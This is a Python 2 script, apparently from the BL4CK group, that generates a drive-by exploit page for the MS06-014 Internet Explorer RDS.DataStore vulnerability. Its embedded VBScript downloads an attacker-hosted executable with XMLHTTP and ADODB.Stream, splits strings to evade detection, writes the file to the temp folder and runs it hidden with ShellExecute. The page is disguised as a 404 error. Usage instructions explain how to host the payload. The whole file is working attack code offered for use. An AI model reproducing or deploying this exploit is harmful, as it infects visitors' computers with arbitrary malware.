#!/bin/sh -
"exec" "python" "-O" "$0" "$@"

__doc__ = """[BL4CK] - MS06-014

RDS.DataStore - Data Execution
CVS-2006-0003
MS06-014

April 2006

*** this is a bit out-dated, but works very well ***

Usage: ./bl4ck_ms06_014.py http://omfg.what.ho.st/~user/stage2.exe 
index.html

Now upload index.html to the same webserver hosting your
http://omfg.what.ho.st/~user/stage2.exe 

                            - redsand@blacksecurity.org
"""

__version__ = "1.0"

import sys, random

class MS06014:
    
    __version = "'[BL4CK] MS06-014 " + __version__ + "\r\n"


    __html = """
    <title></title>
    <head></head>

    <body>

    <script language="VBScript">

    on error resume next

    BL4CK_PAYLOAD

    </script>
    <head>
    <title>[BL4CK] || 404 Not Found</title>
    </head><body>
    <h1>Not Found</h1>
    pwn3d!!
    <hr>
    <!-- <script>location.href='http://google.com'</script> -->
    </body>

    </html>

    """

    __payload = """

    ' due to how ajax works, the file MUST be within the same local 
domain
    dl = "URLFILE"

    ' create adodbstream object
    Set df = document.createElement("object")
    df.setAttribute "classid", 
"clsid:BD96C556-65A3-11D0-983A-00C04FC29E36"
    str="Microsoft.XMLHTTP"
    Set x = df.CreateObject(str,"")

    a1="Ado"
    a2="db."
    a3="Str"
    a4="eam"
    str1=a1&a2&a3&a4
    str5=str1
    set S = df.createobject(str5,"")
    S.type = 1

    ' xml ajax req
    str6="GET"
    x.Open str6, dl, False
    x.Send

    ' Get temp directory and create our destination name
    fname1="bl4ck.com"
    set F = df.createobject("Scripting.FileSystemObject","")
    set tmp = F.GetSpecialFolder(2) ' Get tmp folder
    fname1= F.BuildPath(tmp,fname1)
    S.open
    ' open adodb stream and write contents of request to file
    ' like vbs dl+exec code
    S.write x.responseBody
    ' Saves it with CreateOverwrite flag
    S.savetofile fname1,2

    S.close
    set Q = df.createobject("Shell.Application","")
    Q.ShellExecute fname1,"","","open",0

    """

    def	__init__(self, file):

	self.__file = file



    def bl4ck(self):
	self.__payload = self.__payload.replace("URLFILE",self.__file)

	encoded = self.__payload

	ret = self.__html.replace("BL4CK_PAYLOAD",encoded)

	return ret


if __name__ == '__main__':

	url=False
	out=False

	print "[BL4CK] MS06-014 - redsand@blacksecurity.org"
	print "url path to file must be on the same domain as the htm 
file"
	print "http://blacksecurity.org\r\n"


	argc = len(sys.argv)
	if(argc <= 2):
        	print "USAGE: %s <download url> <outfile>" % sys.argv[0]
        	sys.exit(0)
	if(argc > 1):
       		url = sys.argv[1]
	if(argc > 2):
        	out = sys.argv[2]

        ms = MS06014(url)

       	ret = ms.bl4ck()


	try:
	    fsock = open(out, "w+", 0)
	    try:
	        fsock.write(ret );
	    finally:
	        fsock.close()
	except IOError:
	    pass

	print "Wrote %r bytes to: %s" % (len(ret),out)


